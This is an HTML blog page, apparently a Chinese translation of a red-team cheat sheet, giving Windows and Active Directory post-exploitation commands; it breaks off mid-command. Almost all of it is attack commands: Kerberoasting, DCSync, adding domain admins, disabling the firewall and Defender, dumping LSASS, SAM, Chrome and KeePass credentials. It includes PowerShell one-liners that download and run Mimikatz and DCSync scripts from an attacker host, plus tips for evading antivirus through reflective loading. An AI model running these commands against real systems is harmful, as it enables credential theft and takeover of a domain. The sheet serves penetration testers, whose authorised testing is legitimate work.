<h2 id="Kerberoasting-攻击"><a href="#Kerberoasting-攻击" class="headerlink" title="Kerberoasting 攻击"></a>Kerberoasting 攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 深入查看我的博客文章Kerberos攻击以了解更多信息</span><br><span class="hljs-comment"># https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><br><span class="hljs-built_in">Get-DomainSPNTicket</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-OutputFormat</span> hashcat<br><br>because Hashcat over John anyday right?<br><br><span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br><br>python GetUserSPNs.py <span class="hljs-literal">-request</span> <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.15</span> m0chanad.local/serviceaccount<br><br>Ofc上述要求访问DC上的端口<span class="hljs-number">88</span>，但如果手动执行GetUserSPNs.py，则始终可以进行端口转发。<br><br>https://github.com/GhostPack/SharpRoast <span class="hljs-literal">--NOW</span> Deprecated<span class="hljs-literal">--</span> and incorproated into Rebeus with the kerberoast action<br></code></pre></td></tr></table></figure>
<h2 id="Kerberoast-with-Python"><a href="#Kerberoast-with-Python" class="headerlink" title="Kerberoast with Python"></a>Kerberoast with Python</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#https://github.com/skelsec/kerberoast</span><br><br><br>重要提示：接受的格式如下<br>&lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;<span class="hljs-selector-tag">@</span>&lt;DC_ip&gt;<br>&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;<span class="hljs-selector-tag">@</span>&lt;DC_ip&gt;<br><br><br><br>通过LDAP查找易受攻击的用户：<br>kerberoast ldap all &lt;ldap_connection_string&gt; <span class="hljs-literal">-o</span> ldapenum<br><br>对ldapanom_ASREP_users.txt文件中的用户使用ASREP烧录：<br>kerberoast asreproast &lt;DC_ip&gt; <span class="hljs-literal">-t</span> ldapenum_asrep_users.txt<br><br>对ldapanom_SPN_users.txt文件中的用户使用SPN烧录：<br>kerberoast spnroast &lt;kerberos_connection_string&gt; <span class="hljs-literal">-t</span> ldapenum_spn_users.txt<br></code></pre></td></tr></table></figure>
<h2 id="AS-Rep-Roasting-攻击"><a href="#AS-Rep-Roasting-攻击" class="headerlink" title="AS Rep Roasting 攻击"></a>AS Rep Roasting 攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 帐户必须明确设置DONT_REQ_PREAUTH，使其易受攻击</span><br><br><span class="hljs-built_in">Get-ASRepHash</span> <span class="hljs-literal">-Domain</span> m0chanAD.local <span class="hljs-literal">-User</span> victim<br><br>也可以使用Rebeus（反射加载.NET程序集。）<br><br>.\Rubeus.exe asreproast<br></code></pre></td></tr></table></figure>
<h2 id="DCSync-漏洞攻击"><a href="#DCSync-漏洞攻击" class="headerlink" title="DCSync 漏洞攻击"></a>DCSync 漏洞攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 运行DCSync需要特殊权限。管理员、域管理员或企业管理员的任何成员以及域控制器计算机帐户都可以运行DCSync来提取密码数据。请注意，默认情况下，只读域控制器不允许提取用户的密码数据。</span><br><br><span class="hljs-comment"># 以及将“复制更改”权限设置为“允许”的任何人（即“全部复制更改/复制目录更改”）</span><br><br>mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:corp.local /user:Administrator</span><br><br>powershell.exe <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span> <span class="hljs-literal">-Exec</span> Bypass /c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.6:8000/Invoke-DCSync.ps1&#x27;); Invoke-DCSync -PWDumpFormat&quot;</span><br><br><br>Empire Module: powershell/credentials/mimikatz/dcsync_hashdump<br></code></pre></td></tr></table></figure>
<h2 id="使用Windows终端从管理员帐户升级到系统外壳"><a href="#使用Windows终端从管理员帐户升级到系统外壳" class="headerlink" title="使用Windows终端从管理员帐户升级到系统外壳"></a>使用Windows终端从管理员帐户升级到系统外壳</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://twitter.com/spotheplanet/status/1318487486826504197/photo/1</span><br><br>PsExec.exe <span class="hljs-literal">-i</span> <span class="hljs-literal">-s</span> <span class="hljs-string">&quot;C:\Program Files\WindowsApps\Microsoft.WindowsTerminal.X.X\WindowsTerminal.exe&quot;</span><br><br></code></pre></td></tr></table></figure>
<h1 id="五、Windows-后利用技能"><a href="#五、Windows-后利用技能" class="headerlink" title="五、Windows 后利用技能"></a>五、Windows 后利用技能</h1><h2 id="后渗透常用命令"><a href="#后渗透常用命令" class="headerlink" title="后渗透常用命令"></a>后渗透常用命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net user m0chan /add /domain<br>net localgroup Administrators m0chan /add<br><br><span class="hljs-comment"># 启用RDP</span><br>reg add <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">0</span> /f<br><br>关闭防火墙<br>netsh firewall <span class="hljs-built_in">set</span> opmode disable<br><br>Or like this<br>reg add <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">0</span> /f<br><br><span class="hljs-keyword">If</span> you get this error:<br><br>CredSSP Error Fix -&gt;<br><br>Add this reg key:<br><br>reg add <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d <span class="hljs-number">0</span> /f<br><br>Disable Windows Defender<br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span><br><br></code></pre></td></tr></table></figure>
<h2 id="Esenutl-exe转储锁定的文件"><a href="#Esenutl-exe转储锁定的文件" class="headerlink" title="Esenutl.exe转储锁定的文件"></a>Esenutl.exe转储锁定的文件</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\WINDOWS\system32\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt;<br><br><br>如果您想转储SAM和（或）SYSTEM，但文件被操作系统锁定（Windows <span class="hljs-number">10</span>），这可能很有用<br></code></pre></td></tr></table></figure>
<h2 id="检查Powershell日志记录是否已启用"><a href="#检查Powershell日志记录是否已启用" class="headerlink" title="检查Powershell日志记录是否已启用"></a>检查Powershell日志记录是否已启用</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging<br>reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription<br></code></pre></td></tr></table></figure>
<h2 id="Seatbelt-安全枚举工具"><a href="#Seatbelt-安全枚举工具" class="headerlink" title="Seatbelt 安全枚举工具"></a>Seatbelt 安全枚举工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/GhostPack/Seatbelt</span><br><br>这真是太好了，它可以枚举你所需要的一切，也是一个。NET程序集，因此可以反射加载以避免AV:D双赢<br><br>BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)<br>RebootSchedule        -   Reboot schedule (last <span class="hljs-number">15</span> days) based on event IDs <span class="hljs-number">12</span> and <span class="hljs-number">13</span><br>TokenGroupPrivs       -   Current <span class="hljs-keyword">process</span>/token privileges (e.g. SeDebugPrivilege/etc.)<br>UACSystemPolicies     -   UAC system policies via the registry<br>PowerShellSettings    -   PowerShell versions and security settings<br>AuditSettings         -   Audit settings via the registry<br>WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry<br>LSASettings           -   LSA settings (including auth packages)<br>UserEnvVariables      -   Current user environment variables<br>SystemEnvVariables    -   Current system environment variables<br>UserFolders           -   Folders <span class="hljs-keyword">in</span> C:\Users\<br>NonstandardServices   -   Services with file info company names that don<span class="hljs-string">&#x27;t contain &#x27;</span>Microsoft<span class="hljs-string">&#x27;</span><br><span class="hljs-string">InternetSettings      -   Internet settings including proxy configs</span><br><span class="hljs-string">LapsSettings          -   LAPS settings, if installed</span><br><span class="hljs-string">LocalGroupMembers     -   Members of local admins, RDP, and DCOM</span><br><span class="hljs-string">MappedDrives          -   Mapped drives</span><br><span class="hljs-string">RDPSessions           -   Current incoming RDP sessions</span><br><span class="hljs-string">WMIMappedDrives       -   Mapped drives via WMI</span><br><span class="hljs-string">NetworkShares         -   Network shares</span><br><span class="hljs-string">FirewallRules         -   Deny firewall rules, &quot;full&quot; dumps all</span><br><span class="hljs-string">AntiVirusWMI          -   Registered antivirus (via WMI)</span><br><span class="hljs-string">InterestingProcesses  -   &quot;Interesting&quot; processes- defensive products and admin tools</span><br><span class="hljs-string">RegistryAutoRuns      -   Registry autoruns</span><br><span class="hljs-string">RegistryAutoLogon     -   Registry autologon information</span><br><span class="hljs-string">DNSCache              -   DNS cache entries (via WMI)</span><br><span class="hljs-string">ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)</span><br><span class="hljs-string">AllTcpConnections     -   Lists current TCP connections and associated processes</span><br><span class="hljs-string">AllUdpConnections     -   Lists current UDP connections and associated processes</span><br><span class="hljs-string">NonstandardProcesses  -   Running processeswith file info company names that don&#x27;</span>t contain <span class="hljs-string">&#x27;Microsoft&#x27;</span><br>  *  <span class="hljs-keyword">If</span> the user is <span class="hljs-keyword">in</span> high integrity, the following additional actions are run:<br>SysmonConfig          -   Sysmon configuration from the registry<br><br>And more!!<br></code></pre></td></tr></table></figure>
<h2 id="转储凭据"><a href="#转储凭据" class="headerlink" title="转储凭据"></a>转储凭据</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-built_in">new-object</span> System.Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-Mimikatz</span> <br><br>也可以在一些AV Evasion删除字符串等之后运行Mimikatz.exe。ippSec有一个很好的教程。<br><br>mimikatz.exe<br>privlege::debug<br>sekurlsa::logonPasswords full<br><br>更安全的方法是使用MiniDump转储LSASS.exe的进程内存<br>(https://github.com/<span class="hljs-number">3</span>xpl01tc0d3<span class="hljs-built_in">r</span>/Minidump)<br><br>(or) https://github.com/GhostPack/SharpDump<br><br>并将.bin发送到Mimikatz本地。<br><br>sekurlsa::minidump C:\users\m0chan\lssas.dmp<br><br>也可以用于转储和通过票证攻击，但将在其他地方进行覆盖。<br><br>Mimikatz Guide<br><br><span class="hljs-comment">#Logon Sessions</span><br><br>sekurlsa::logonPasswords all<br><br><span class="hljs-comment">#Dump Cache</span><br><br>lsadump::cache<br><br><span class="hljs-comment">#Dump SAM</span><br><br>lsadump::sam<br></code></pre></td></tr></table></figure>
<h2 id="转储凭据-2"><a href="#转储凭据-2" class="headerlink" title="转储凭据 2"></a>转储凭据 2</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/AlessandroZ/LaZagne</span><br><br>laZagne.exe all<br>laZagne.exe browsers<br>laZagne.exe browsers <span class="hljs-literal">-firefox</span><br><br></code></pre></td></tr></table></figure>
<h2 id="使用WinRM远程转储SAM"><a href="#使用WinRM远程转储SAM" class="headerlink" title="使用WinRM远程转储SAM"></a>使用WinRM远程转储SAM</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> m0chan <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-ScriptBlock</span> &#123;reg save hklm\sam c:\temp\sam.save&#125;<br><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> m0chan <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-ScriptBlock</span> &#123;reg save hklm\system c:\temp\system.save&#125;<br><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> m0chan <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-ScriptBlock</span> &#123;reg save hklm\security c:\temp\security.save&#125;<br><br></code></pre></td></tr></table></figure>
<h2 id="使用GadgetToJScript或VBS运行Mimikatz"><a href="#使用GadgetToJScript或VBS运行Mimikatz" class="headerlink" title="使用GadgetToJScript或VBS运行Mimikatz"></a>使用GadgetToJScript或VBS运行Mimikatz</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://gist.github.com/med0x2e/cc10d42b1f581507013e801da2651c74</span><br><br>cscript mimi.js privilege::debug &lt; safe.txt<br></code></pre></td></tr></table></figure>
<h2 id="SessionGopher-工具"><a href="#SessionGopher-工具" class="headerlink" title="SessionGopher 工具"></a>SessionGopher 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/Arvanaghi/SessionGopher</span><br><br>悄悄地为PuTTY、WinSCP、FileZilla、SuperPuTTY和RDP挖掘保存的会话信息<br><br>SessionGopher是一个PowerShell工具，用于查找和解密远程访问工具保存的会话信息。它内置了WMI功能，因此可以远程运行。它的最佳用例是识别可能连接到Unix系统、跳转框或销售点终端的系统<br><br><span class="hljs-built_in">Invoke-SessionGopher</span> <span class="hljs-literal">-Thorough</span><br><br><span class="hljs-built_in">Import-Module</span> path\to\SessionGopher.ps1;<br><span class="hljs-built_in">Invoke-SessionGopher</span> <span class="hljs-literal">-AllDomain</span> <span class="hljs-literal">-u</span> domain.com\adm<span class="hljs-literal">-arvanaghi</span> <span class="hljs-literal">-p</span> s3cr3tP@ss<br><br></code></pre></td></tr></table></figure>
<h2 id="转储Chrome密码（也称为漏洞利用后）-1"><a href="#转储Chrome密码（也称为漏洞利用后）-1" class="headerlink" title="转储Chrome密码（也称为漏洞利用后）"></a>转储Chrome密码（也称为漏洞利用后）</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># git clone https://github.com/rasta-mouse/CookieMonster</span><br><br>CookieMonster creds<br>CookieMonster.exe cookies <span class="hljs-literal">-d</span> [<span class="hljs-type">domain</span>] <span class="hljs-literal">-e</span> <br>CookieMonster <span class="hljs-literal">-a</span> <br><br>必须在目标用户的上下文中运行，因为chrome密码是用DPAPI加密的。<br><br>Can also use Mimikatz <span class="hljs-keyword">for</span> this.<br><br>mimikatz dpapi::chrome /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><br>mimikatz dpapi::chrome /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span> /unprotect<br><br>mimikatz dpapi::chrome /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot;</span> /unprotect<br></code></pre></td></tr></table></figure>
<h2 id="转储进程内存w-Mimikittenz"><a href="#转储进程内存w-Mimikittenz" class="headerlink" title="转储进程内存w&#x2F;Mimikittenz"></a>转储进程内存w&#x2F;Mimikittenz</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/putterpanda/mimikittenz</span><br><br>mimikittenz是一种利用后的powershell工具，它利用Windows函数ReadProcessMemory（）从各种目标进程中提取纯文本密码。<br><br>mimikitenz的目标是提供用户级（非管理员特权）敏感数据提取，以最大限度地提高利用后的努力，并增加每个目标收集的信息的价值。<br><br><span class="hljs-built_in">Invoke-Mimikittenz</span><br></code></pre></td></tr></table></figure>
<h2 id="转储KeePass"><a href="#转储KeePass" class="headerlink" title="转储KeePass"></a>转储KeePass</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/HarmJ0y/KeeThief</span><br><span class="hljs-comment"># http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><br><span class="hljs-built_in">Get-Process</span> keepass<br>tasklist | findstr keepass<br><br>Attacking KeePass<br><br><span class="hljs-comment"># https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="hljs-built_in">Import-Module</span> KeeThief.ps1<br><span class="hljs-built_in">Get-KeePassDatabaseKey</span> <span class="hljs-literal">-Verbose</span><br><br>KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.<br></code></pre></td></tr></table></figure>
<h2 id="pypykatz-工具"><a href="#pypykatz-工具" class="headerlink" title="pypykatz 工具"></a>pypykatz 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/skelsec/pypykatz</span><br><br>Full python implementation of Mimikatz :D <br><br>pip3 install pypykatz<br></code></pre></td></tr></table></figure>
<h2 id="SafetyKatz-工具"><a href="#SafetyKatz-工具" class="headerlink" title="SafetyKatz 工具"></a>SafetyKatz 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/GhostPack/SafetyKatz</span><br><br>可以反射加载的Mimikatz的完整C Sharp Implementation：D<br><br>“SafetyKatz是@gentilkiwis Mimikatz项目和@subte的.NET PE Loader的略微修改版本的组合。<br><br>首先，MiniDumpWriteDump Win32 API调用用于创建LSASS到C:\Windows\Temp\debug.bin的小型转储。然后@subtes PELoader用于加载Mimikatz的自定义版本，该版本在小型转储文件上运行sekulsa:：logonpasswords和sekulsa：：ekeys，在执行完成后删除该文件。<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="SharpDPAPI-工具"><a href="#SharpDPAPI-工具" class="headerlink" title="SharpDPAPI 工具"></a>SharpDPAPI 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/GhostPack/SharpDPAPI</span><br><br>Mimikatzs DPAPI功能的完整C Sharp实现，允许访问DPAPI功能。<br></code></pre></td></tr></table></figure>
<h2 id="SharpSniper-工具"><a href="#SharpSniper-工具" class="headerlink" title="SharpSniper 工具"></a>SharpSniper 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/HunnicCyber/SharpSniper</span><br><br>通常，红队的参与不仅仅是实现域管理。一些客户端会想看看域中的特定用户是否会受到威胁，例如CEO。<br><br>SharpSnipper是一个简单的工具，可以找到这些用户的IP地址，这样你就可以瞄准他们的盒子。<br><br>C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123<br><br>User: emusk - IP Address: <span class="hljs-number">192.168</span>.<span class="hljs-number">37.130</span><br><br></code></pre></td></tr></table></figure>
<h2 id="SharpLocker-工具"><a href="#SharpLocker-工具" class="headerlink" title="SharpLocker 工具"></a>SharpLocker 工具</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/Pickfordmatt/SharpLocker</span><br><br>SharpLocker通过弹出一个假的Windows锁定屏幕来帮助获取当前用户凭据，所有输出都会发送到控制台，该控制台非常适合Cobalt Strike。<br><br></code></pre></td></tr></table></figure>
<h2 id="检查是否缺少的KB补丁清单"><a href="#检查是否缺少的KB补丁清单" class="headerlink" title="检查是否缺少的KB补丁清单"></a>检查是否缺少的KB补丁清单</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">watson.exe<br>Sherlock.ps1<br><br>使用Watson.exe程序集并进行反射加载。NET汇编到内存中以避免防病毒。<br><br>更多在底部重新。反射加载的东西。（更改某些字符串等也没有坏处）<br><br>https://github.com/rasta<span class="hljs-literal">-mouse</span>/Watson<br></code></pre></td></tr></table></figure>
<h2 id="使用Mimikatz解密EFS文件（如果是Admin-System）"><a href="#使用Mimikatz解密EFS文件（如果是Admin-System）" class="headerlink" title="使用Mimikatz解密EFS文件（如果是Admin&#x2F;System）"></a>使用Mimikatz解密EFS文件（如果是Admin&#x2F;System）</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</span><br><br>cipher /c <span class="hljs-string">&quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot;</span> - View <span class="hljs-keyword">if</span> File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.<br><br>privilege::debug <br>token::elevate <br>crypto::system /file:<span class="hljs-string">&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot;</span> /export<br><br>dpapi::capi /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;</span><br><br>dpapi::masterkey /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot;</span> /password:waza1234/<br><br>dpapi::capi /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;</span> /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b<br><br>openssl x509 <span class="hljs-literal">-inform</span> DER <span class="hljs-literal">-outform</span> PEM <span class="hljs-operator">-in</span> B53C6DE283C00203587A03DD3D0BF66E16969A55.der <span class="hljs-literal">-out</span> public.pem<br><br>openssl rsa <span class="hljs-literal">-inform</span> PVK <span class="hljs-literal">-outform</span> PEM <span class="hljs-operator">-in</span> raw_exchange_capi_0_ffb75517<span class="hljs-literal">-bc6c-4a40-8f8b-e2c555e30e34</span>.pvk <span class="hljs-literal">-out</span> private.pem<br><br>openssl pkcs12 <span class="hljs-operator">-in</span> public.pem <span class="hljs-literal">-inkey</span> private.pem <span 